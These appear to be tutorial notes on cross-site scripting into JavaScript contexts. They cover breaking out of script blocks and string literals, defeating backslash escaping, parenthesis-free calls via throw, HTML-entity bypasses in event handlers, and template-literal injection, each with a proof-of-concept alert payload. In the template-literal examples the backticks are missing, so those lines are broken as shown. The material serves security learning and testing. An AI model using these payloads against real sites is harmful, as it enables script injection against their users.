# 22. XSS into JavaScript

## 💥 XSS in Existing JavaScript Contexts

When the XSS context is **inside existing JavaScript** within a response, different attack techniques are needed depending on the situation.

---

### 🛑 Terminating the Existing Script

If possible, close the existing `<script>` tag and insert new HTML tags that trigger JavaScript execution.

**Example context:**

```jsx
<script>
...
var input = 'controllable data here';
...
</script>
```

**Payload to break out:**

```jsx
</script><img src=1 onerror=alert(document.domain)>
```

> The browser first parses HTML (including <script> blocks), then executes JavaScript. The broken script leaves an unterminated string but does not prevent the injected script from running.
> 

---

### 🪢 Breaking Out of a JavaScript String Literal

If your injection point is inside a quoted string, break out of the string carefully and fix the syntax afterward.

**Useful payloads:**

```jsx
'-alert(document.domain)-'
';alert(document.domain)//
```

### 🔄 Bypassing Escaped Quotes with Backslashes

When applications escape single quotes (`'`) with a backslash (`\`), you can neutralize that by injecting your own backslash.

- Input:

```jsx
';alert(document.domain)//
```

- Application escapes to:

```
\';alert(document.domain)//
```

- You inject:

```
\';alert(document.domain)//
```

- This becomes:

```
\\';alert(document.domain)//
```

The first `\` escapes the second `\`, so the quote `'` is now interpreted as a string terminator, allowing the attack.

---

### 🛡️ Character Restrictions and Alternative Execution

If characters are restricted by the site or WAF, try alternative execution methods:

- Use `throw` with an exception handler to call functions **without parentheses**.

**Example:**

```jsx
onerror=alert;throw 1
```

- This assigns `alert()` to the global exception handler; `throw 1` invokes it with `1`.

> More about calling functions without parentheses here.
> 

---

### 🧩 Using HTML-Encoding to Bypass Filters

When inside quoted tag attributes (like event handlers), use HTML entities to bypass filtering.

**Example context:**

```jsx
<a href="#" onclick="... var input='controllable data here'; ...">
```

**Payload if single quotes are blocked:**

```
&apos;-alert(document.domain)-&apos;
```

- The browser decodes `&apos;` to `'` before executing JavaScript, allowing string termination and code execution.

---

### 📜 XSS in JavaScript Template Literals

Template literals use backticks (```) and `${...}` syntax for embedded expressions.

**Example:**

```jsx
document.getElementById('message').innerText = Welcome, ${user.displayName}.;
```

If the XSS context is inside a template literal:

```jsx
<script>
...
var input = controllable data here;
...
</script>
```

You can inject a payload without terminating the literal, using `${...}`:

```jsx
${alert(document.domain)}
```